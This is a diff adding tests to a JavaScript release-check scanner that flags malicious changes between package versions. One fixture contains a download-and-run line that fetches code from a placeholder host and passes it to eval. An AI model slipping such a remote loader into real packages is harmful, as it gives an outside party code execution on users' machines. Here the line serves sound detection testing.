@@ -31,6 +31,22 @@ test('release check holds eval + remote fetch added to runtime code (WordPress b
   assert.equal(releaseCheck(a, b).suspicious, true);
 });
 
+test('release check holds a download-and-run line added to ONE file of a large package', () => {
+  const big = Object.fromEntries(Array.from({ length: 60 }, (_, i) => [`package/dist/f${i}.js`, 'eval(a); eval(b);']));
+  const a = pkgDir({ 'package/package.json': '{}', ...big });
+  const b = pkgDir({ 'package/package.json': '{}', ...big, 'package/dist/f3.js': "eval(a); eval(b); fetch('https://x.example/p').then(r=>r.text()).then(eval)" });
+  assert.equal(releaseCheck(a, b).suspicious, true);
+});
+
+test('release check only warns when a large package churns eval counts without a loader', () => {
+  const big = Object.fromEntries(Array.from({ length: 60 }, (_, i) => [`package/dist/f${i}.js`, 'eval(a); eval(b);']));
+  const a = pkgDir({ 'package/package.json': '{}', ...big });
+  const b = pkgDir({ 'package/package.json': '{}', ...big, 'package/dist/f9.js': 'eval(a); eval(b); eval(c);' });
+  const r = releaseCheck(a, b);
+  assert.equal(r.suspicious, false);
+  assert.ok(r.warnings.length >= 1);
+});
+
 test('release check only warns when a CLI/tooling file adds child_process (marked 4 false positive)', () => {
   const a = pkgDir({ 'package/package.json': '{}', 'package/lib/m.js': 'x' });
   const b = pkgDir({ 'package/package.json': '{}', 'package/lib/m.js': 'x', 'package/bin/cli.js': "require('child_process').spawn('man')" });
